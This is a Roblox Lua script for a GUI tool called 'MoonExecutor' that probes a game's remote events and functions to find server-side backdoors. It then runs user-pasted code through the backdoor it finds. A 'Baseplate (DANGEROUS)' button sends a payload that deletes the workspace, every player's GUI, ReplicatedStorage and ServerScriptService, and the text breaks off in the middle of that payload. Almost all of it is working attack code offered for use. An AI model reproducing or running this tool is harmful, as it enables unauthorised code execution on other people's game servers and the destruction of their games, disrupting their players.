--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 

designed using localmaze gui creator
]=]

-- Instances: 39 | Scripts: 7 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.KHAFIDZKTP.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame
LMG2L["MenuInjectFrame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MenuInjectFrame_2"]["BorderSizePixel"] = 0;
LMG2L["MenuInjectFrame_2"]["BackgroundColor3"] = Color3.fromRGB(6, 20, 57);
LMG2L["MenuInjectFrame_2"]["Size"] = UDim2.new(0.4043, 0, 0.39197, 0);
LMG2L["MenuInjectFrame_2"]["Position"] = UDim2.new(0.30586, 0, 0.29704, 0);
LMG2L["MenuInjectFrame_2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["MenuInjectFrame_2"]["Name"] = [[MenuInjectFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning 
LMG2L["Scanning _3"] = Instance.new("TextButton", LMG2L["MenuInjectFrame_2"]);
LMG2L["Scanning _3"]["TextWrapped"] = true;
LMG2L["Scanning _3"]["TextStrokeTransparency"] = 0;
LMG2L["Scanning _3"]["RichText"] = true;
LMG2L["Scanning _3"]["BorderSizePixel"] = 0;
LMG2L["Scanning _3"]["TextScaled"] = true;
LMG2L["Scanning _3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Scanning _3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Scanning _3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Scanning _3"]["Size"] = UDim2.new(0.7913, 0, 0.58594, 0);
LMG2L["Scanning _3"]["Text"] = [[Scan Now]];
LMG2L["Scanning _3"]["Name"] = [[Scanning ]];
LMG2L["Scanning _3"]["Position"] = UDim2.new(0.11304, 0, 0.21875, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UICorner
LMG2L["UICorner_4"] = Instance.new("UICorner", LMG2L["Scanning _3"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
LMG2L["ScanScript_5"] = Instance.new("LocalScript", LMG2L["Scanning _3"]);
LMG2L["ScanScript_5"]["Name"] = [[ScanScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UIStroke
LMG2L["UIStroke_6"] = Instance.new("UIStroke", LMG2L["Scanning _3"]);
LMG2L["UIStroke_6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_6"]["Color"] = Color3.fromRGB(227, 12, 237);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UICorner
LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["MenuInjectFrame_2"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_8"] = Instance.new("UIAspectRatioConstraint", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIAspectRatioConstraint_8"]["AspectRatio"] = 1.79688;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
LMG2L["DraggingScript_9"] = Instance.new("LocalScript", LMG2L["MenuInjectFrame_2"]);
LMG2L["DraggingScript_9"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIStroke
LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 0, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.MoonExecutorText
LMG2L["MoonExecutorText_b"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
LMG2L["MoonExecutorText_b"]["TextWrapped"] = true;
LMG2L["MoonExecutorText_b"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutorText_b"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutorText_b"]["TextScaled"] = true;
LMG2L["MoonExecutorText_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutorText_b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutorText_b"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutorText_b"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutorText_b"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
LMG2L["MoonExecutorText_b"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutorText_b"]["Name"] = [[MoonExecutorText]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame
LMG2L["MainFrame_c"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MainFrame_c"]["Visible"] = false;
LMG2L["MainFrame_c"]["BorderSizePixel"] = 0;
LMG2L["MainFrame_c"]["BackgroundColor3"] = Color3.fromRGB(85, 85, 85);
LMG2L["MainFrame_c"]["Size"] = UDim2.new(0.50977, 0, 0.54815, 0);
LMG2L["MainFrame_c"]["Position"] = UDim2.new(0.24961, 0, 0.25723, 0);
LMG2L["MainFrame_c"]["Name"] = [[MainFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.Versi
LMG2L["Versi_d"] = Instance.new("TextLabel", LMG2L["MainFrame_c"]);
LMG2L["Versi_d"]["TextWrapped"] = true;
LMG2L["Versi_d"]["BorderSizePixel"] = 0;
LMG2L["Versi_d"]["TextTransparency"] = 0.6;
LMG2L["Versi_d"]["TextScaled"] = true;
LMG2L["Versi_d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Versi_d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_d"]["BackgroundTransparency"] = 1;
LMG2L["Versi_d"]["RichText"] = true;
LMG2L["Versi_d"]["Size"] = UDim2.new(0.11379, 0, 0.0838, 0);
LMG2L["Versi_d"]["Text"] = [[v0.0.1]];
LMG2L["Versi_d"]["Name"] = [[Versi]];
LMG2L["Versi_d"]["Position"] = UDim2.new(0.87931, 0, 0.90503, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UICorner
LMG2L["UICorner_e"] = Instance.new("UICorner", LMG2L["MainFrame_c"]);
LMG2L["UICorner_e"]["CornerRadius"] = UDim.new(0.01, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.CoderBox
LMG2L["CoderBox_f"] = Instance.new("TextBox", LMG2L["MainFrame_c"]);
LMG2L["CoderBox_f"]["Name"] = [[CoderBox]];
LMG2L["CoderBox_f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["CoderBox_f"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_f"]["BorderSizePixel"] = 0;
LMG2L["CoderBox_f"]["TextWrapped"] = true;
LMG2L["CoderBox_f"]["TextSize"] = 18;
LMG2L["CoderBox_f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["CoderBox_f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["CoderBox_f"]["RichText"] = true;
LMG2L["CoderBox_f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["CoderBox_f"]["MultiLine"] = true;
LMG2L["CoderBox_f"]["PlaceholderText"] = [[Paste Your Script Here!]];
LMG2L["CoderBox_f"]["Size"] = UDim2.new(0, 438, 0, 236);
LMG2L["CoderBox_f"]["Position"] = UDim2.new(0.08621, 0, 0.12291, 0);
LMG2L["CoderBox_f"]["Text"] = [[Paste Your Script Here]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.CoderBox.UICorner
LMG2L["UICorner_10"] = Instance.new("UICorner", LMG2L["CoderBox_f"]);
LMG2L["UICorner_10"]["CornerRadius"] = UDim.new(0, 1);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_11"] = Instance.new("UIAspectRatioConstraint", LMG2L["MainFrame_c"]);
LMG2L["UIAspectRatioConstraint_11"]["AspectRatio"] = 1.62011;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIStroke
LMG2L["UIStroke_12"] = Instance.new("UIStroke", LMG2L["MainFrame_c"]);
LMG2L["UIStroke_12"]["Thickness"] = 7;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton
LMG2L["ExecuteButton_13"] = Instance.new("TextButton", LMG2L["MainFrame_c"]);
LMG2L["ExecuteButton_13"]["TextWrapped"] = true;
LMG2L["ExecuteButton_13"]["BorderSizePixel"] = 0;
LMG2L["ExecuteButton_13"]["TextScaled"] = true;
LMG2L["ExecuteButton_13"]["TextColor3"] = Color3.fromRGB(22, 255, 19);
LMG2L["ExecuteButton_13"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
LMG2L["ExecuteButton_13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["ExecuteButton_13"]["Size"] = UDim2.new(0.18276, 0, 0.10615, 0);
LMG2L["ExecuteButton_13"]["Text"] = [[Execute]];
LMG2L["ExecuteButton_13"]["Name"] = [[ExecuteButton]];
LMG2L["ExecuteButton_13"]["Position"] = UDim2.new(0.0931, 0, 0.85475, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.UICorner
LMG2L["UICorner_14"] = Instance.new("UICorner", LMG2L["ExecuteButton_13"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.EXECUTESCRIPT
LMG2L["EXECUTESCRIPT_15"] = Instance.new("LocalScript", LMG2L["ExecuteButton_13"]);
LMG2L["EXECUTESCRIPT_15"]["Name"] = [[EXECUTESCRIPT]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.DraggingScript
LMG2L["DraggingScript_16"] = Instance.new("LocalScript", LMG2L["MainFrame_c"]);
LMG2L["DraggingScript_16"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.MoonExecutor
LMG2L["MoonExecutor_17"] = Instance.new("TextLabel", LMG2L["MainFrame_c"]);
LMG2L["MoonExecutor_17"]["TextWrapped"] = true;
LMG2L["MoonExecutor_17"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutor_17"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutor_17"]["TextScaled"] = true;
LMG2L["MoonExecutor_17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutor_17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutor_17"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutor_17"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutor_17"]["Size"] = UDim2.new(0.78966, 0, 0.12849, 0);
LMG2L["MoonExecutor_17"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutor_17"]["Name"] = [[MoonExecutor]];
LMG2L["MoonExecutor_17"]["Position"] = UDim2.new(0.11379, 0, -0.00559, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame
LMG2L["TabsFrame_18"] = Instance.new("Frame", LMG2L["MainFrame_c"]);
LMG2L["TabsFrame_18"]["BorderSizePixel"] = 0;
LMG2L["TabsFrame_18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TabsFrame_18"]["Size"] = UDim2.new(0, 80, 0, 236);
LMG2L["TabsFrame_18"]["Position"] = UDim2.new(0, 494, 0, 46);
LMG2L["TabsFrame_18"]["Name"] = [[TabsFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton
LMG2L["ScriptButton_19"] = Instance.new("TextButton", LMG2L["TabsFrame_18"]);
LMG2L["ScriptButton_19"]["TextWrapped"] = true;
LMG2L["ScriptButton_19"]["BorderSizePixel"] = 0;
LMG2L["ScriptButton_19"]["TextScaled"] = true;
LMG2L["ScriptButton_19"]["BackgroundColor3"] = Color3.fromRGB(102, 5, 255);
LMG2L["ScriptButton_19"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["ScriptButton_19"]["Size"] = UDim2.new(0, 60, 0, 50);
LMG2L["ScriptButton_19"]["Text"] = [[ScriptHub]];
LMG2L["ScriptButton_19"]["Name"] = [[ScriptButton]];
LMG2L["ScriptButton_19"]["Position"] = UDim2.new(0, 10, 0, 22);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton.UICorner
LMG2L["UICorner_1a"] = Instance.new("UICorner", LMG2L["ScriptButton_19"]);
LMG2L["UICorner_1a"]["CornerRadius"] = UDim.new(0, 7);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton.switchscript
LMG2L["switchscript_1b"] = Instance.new("LocalScript", LMG2L["ScriptButton_19"]);
LMG2L["switchscript_1b"]["Name"] = [[switchscript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.UICorner
LMG2L["UICorner_1c"] = Instance.new("UICorner", LMG2L["TabsFrame_18"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame
LMG2L["ScripthubFrame_1d"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["ScripthubFrame_1d"]["Visible"] = false;
LMG2L["ScripthubFrame_1d"]["BorderSizePixel"] = 0;
LMG2L["ScripthubFrame_1d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["ScripthubFrame_1d"]["Size"] = UDim2.new(0, 592, 0, 348);
LMG2L["ScripthubFrame_1d"]["Position"] = UDim2.new(0, 288, 0, 136);
LMG2L["ScripthubFrame_1d"]["Name"] = [[ScripthubFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame
LMG2L["ScriptMainFrame_1e"] = Instance.new("Frame", LMG2L["ScripthubFrame_1d"]);
LMG2L["ScriptMainFrame_1e"]["BorderSizePixel"] = 0;
LMG2L["ScriptMainFrame_1e"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
LMG2L["ScriptMainFrame_1e"]["Size"] = UDim2.new(0, 566, 0, 328);
LMG2L["ScriptMainFrame_1e"]["Position"] = UDim2.new(0, 14, 0, 10);
LMG2L["ScriptMainFrame_1e"]["Name"] = [[ScriptMainFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.UICorner
LMG2L["UICorner_1f"] = Instance.new("UICorner", LMG2L["ScriptMainFrame_1e"]);
LMG2L["UICorner_1f"]["CornerRadius"] = UDim.new(0, 1);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame
LMG2L["ScrollingFrame_20"] = Instance.new("ScrollingFrame", LMG2L["ScriptMainFrame_1e"]);
LMG2L["ScrollingFrame_20"]["BorderSizePixel"] = 0;
LMG2L["ScrollingFrame_20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ScrollingFrame_20"]["Size"] = UDim2.new(0, 556, 0, 328);
LMG2L["ScrollingFrame_20"]["BackgroundTransparency"] = 1;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate
LMG2L["Baseplate_21"] = Instance.new("TextButton", LMG2L["ScrollingFrame_20"]);
LMG2L["Baseplate_21"]["TextWrapped"] = true;
LMG2L["Baseplate_21"]["RichText"] = true;
LMG2L["Baseplate_21"]["BorderSizePixel"] = 0;
LMG2L["Baseplate_21"]["TextScaled"] = true;
LMG2L["Baseplate_21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Baseplate_21"]["BackgroundColor3"] = Color3.fromRGB(187, 187, 187);
LMG2L["Baseplate_21"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Baseplate_21"]["Size"] = UDim2.new(0, 94, 0, 42);
LMG2L["Baseplate_21"]["Text"] = [[Baseplate (DANGEROUS)]];
LMG2L["Baseplate_21"]["Name"] = [[Baseplate]];
LMG2L["Baseplate_21"]["Position"] = UDim2.new(0, 12, 0, 64);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.UICorner
LMG2L["UICorner_22"] = Instance.new("UICorner", LMG2L["Baseplate_21"]);
LMG2L["UICorner_22"]["CornerRadius"] = UDim.new(0, 4);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.LocalScript
LMG2L["LocalScript_23"] = Instance.new("LocalScript", LMG2L["Baseplate_21"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.UIGradient
LMG2L["UIGradient_24"] = Instance.new("UIGradient", LMG2L["ScriptMainFrame_1e"]);
LMG2L["UIGradient_24"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 249)),ColorSequenceKeypoint.new(0.948, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton
LMG2L["CloseButton_25"] = Instance.new("TextButton", LMG2L["ScriptMainFrame_1e"]);
LMG2L["CloseButton_25"]["TextWrapped"] = true;
LMG2L["CloseButton_25"]["BorderSizePixel"] = 0;
LMG2L["CloseButton_25"]["TextScaled"] = true;
LMG2L["CloseButton_25"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
LMG2L["CloseButton_25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CloseButton_25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["CloseButton_25"]["BackgroundTransparency"] = 1;
LMG2L["CloseButton_25"]["Size"] = UDim2.new(0, 46, 0, 32);
LMG2L["CloseButton_25"]["Text"] = [[X]];
LMG2L["CloseButton_25"]["Name"] = [[CloseButton]];
LMG2L["CloseButton_25"]["Position"] = UDim2.new(0, 530, 0, -12);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton.CloseScript
LMG2L["CloseScript_26"] = Instance.new("LocalScript", LMG2L["CloseButton_25"]);
LMG2L["CloseScript_26"]["Name"] = [[CloseScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.UICorner
LMG2L["UICorner_27"] = Instance.new("UICorner", LMG2L["ScripthubFrame_1d"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
local function C_5()
	local script = LMG2L["ScanScript_5"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	local playerGui = player:WaitForChild("PlayerGui")	
	
	local isScanning = false	
	
	local function runRemote(remote, data)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(data)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function() remote:InvokeServer(data) end)	
		end	
	end	
	
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}	
	local function generateName(length)	
		local text = ""	
		for i = 1, length do	
			text = text .. alphabet[math.random(1, #alphabet)]	
		end	
		return text	
	end	
	
	local function findBackdoor()	
		local remotes = {}	
	
		local protected = game:GetService("ReplicatedStorage"):FindFirstChild("lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId)	
		if protected and protected:IsA("RemoteFunction") then	
			local code = generateName(math.random(12, 30))	
			task.spawn(function()	
				protected:InvokeServer("lalol", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			end)	
			remotes[code] = protected	
		end	
	
		for _, remote in game:GetDescendants() do	
			if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end	
			if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then continue end	
	
			local rs = game:GetService("ReplicatedStorage")	
			if remote.Parent == rs or remote.Parent.Parent == rs or remote.Parent.Parent.Parent == rs then	
				if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then continue end	
				if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then continue end	
				if remote.Parent.Name == "DefaultChatSystemChatEvents" then continue end	
			end	
	
			local code = generateName(math.random(12, 30))	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			remotes[code] = remote	
		end	
	
		for i = 1, 100 do	
			for code, remote in remotes do	
				if workspace:FindFirstChild(code) then	
					return remote	
				end	
			end	
			task.wait()	
		end	
	
		return nil	
	end	
	
	button.MouseButton1Click:Connect(function()	
		if isScanning then return end	
		isScanning = true	
	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
	
		local startTime = tick()	
		task.spawn(function()	
			while isScanning and (tick() - startTime) < 5 do	
				button.Text = "Scan." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan.." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan..." task.wait(0.4)	
			end	
		end)	
	
		local backdoor = findBackdoor()	
	
		local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
		local mainFrame = screenGui and screenGui:FindFirstChild("MainFrame")	
		local menuInjectFrame = button.Parent	
	
		isScanning = false	
	
		if backdoor and mainFrame then	
			_G.MoonBackdoor = backdoor	
	
			button.Text = "Found!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
	
			task.wait(0.5)	
	
			local hint = Instance.new("Hint")	
			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP | DisplayName YTZ_DEXZ"	
			hint.Parent = player.Character	
	
			mainFrame.Visible = true	
			menuInjectFrame.Visible = false	
	
			task.wait(100)	
			hint:Destroy()	
		else	
			button.TextColor3 = Color3.fromRGB(255, 0, 0)	
			if not backdoor then	
				button.Text = "No Backdoor Found :("	
			else	
				button.Text = "MainFrame Not Found :("	
			end	
		end	
	end)	
end;
task.spawn(C_5);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
local function C_9()
	local script = LMG2L["DraggingScript_9"];
	local frame = script.Parent -- MainFrame	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1 	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or 	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_9);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.EXECUTESCRIPT
local function C_15()
	local script = LMG2L["EXECUTESCRIPT_15"];
	local button = script.Parent	
	local mainFrame = button.Parent -- ExecuteButton > MainFrame	
	local coderBox = mainFrame:WaitForChild("CoderBox")	
	local player = game.Players.LocalPlayer	
	
	local function runRemote(remote, code)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(code)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function()	
				local ok, result = pcall(function()	
					return remote:InvokeServer(code)	
				end)	
				if ok and result ~= nil then	
					warn("[MoonExecutor] Response: " .. tostring(result))	
				end	
			end)	
		end	
	end	
	
	button.MouseButton1Click:Connect(function()	
		local backdoor = _G.MoonBackdoor	
	
		if not backdoor then	
			button.Text = "No Backdoor!"	
			button.TextColor3 = Color3.fromRGB(255, 80, 80)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
			return	
		end	
	
		local code = string.gsub(coderBox.Text, "%%username%%", player.Name)	
	
		if code ~= "" then	
			button.Text = "Running..."	
			button.TextColor3 = Color3.fromRGB(255, 255, 0)	
			runRemote(backdoor, code)	
	
	local maxRetry = 3	
	for i = 1, maxRetry do	
	    runRemote(backdoor, code)	
	    task.wait(0.3)	
	end	
	
			task.wait(0.5)	
			button.Text = "Executed!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		else	
			button.Text = "Empty!"	
			button.TextColor3 = Color3.fromRGB(255, 100, 100)	
			task.wait(1)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		end	
	end)	
end;
task.spawn(C_15);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.DraggingScript
local function C_16()
	local script = LMG2L["DraggingScript_16"];
	local frame = script.Parent -- MainFrame	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1 	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or 	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_16);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton.switchscript
local function C_1b()
	local script = LMG2L["switchscript_1b"];
	local button = script.Parent	
	local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
	local mainFrame = screenGui:FindFirstChild("ScripthubFrame")	
	local menuInjectFrame = screenGui:FindFirstChild("MainFrame")	
	
	button.MouseButton1Click:Connect(function()	
		mainFrame.Visible = true	
		menuInjectFrame.Visible = false	
	end)	
end;
task.spawn(C_1b);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.LocalScript
local function C_23()
	local script = LMG2L["LocalScript_23"];
	local button = script.Parent	
	
	button.MouseButton1Click:Connect(function()	
		local backdoor = _G.MoonBackdoor	
	
		if not backdoor then	
			warn("[MoonExecutor] No backdoor found!")	
			return	
		end	
	
		local code = [[	
	-- 1. Hapus semua Workspace kecuali Baseplate & Terrain	
	for _, obj in workspace:GetChildren() do	
		if obj.Name ~= "Baseplate" and not obj:IsA("Terrain") then	
			obj:Destroy()	
		end	
	end	
	
	-- 2. Hapus PlayerGui semua player	
	for _, plr in game:GetService("Players"):GetPlayers() do	
		for _, obj in plr.PlayerGui:GetChildren() do	
			obj:Destroy()	
		end	
	end	
	
	-- 3. Hapus StarterGui	
	for _, obj in game:GetService("StarterGui"):GetChildren() do	
		obj:Destroy()	
	end	
	
	-- 4. Hapus ReplicatedStorage	
	for _, obj in game:GetService("ReplicatedStorage"):GetChildren() do	
		obj:Destroy()	
	end	
	
	-- 5. Hapus ServerScriptService	
	for _, obj in game:GetService("ServerScriptService"):GetChildren() do	
		obj:Destroy()	
	end	
	
	-- 6. Hint permanen	
	local hint = Instance.new("Hint")	
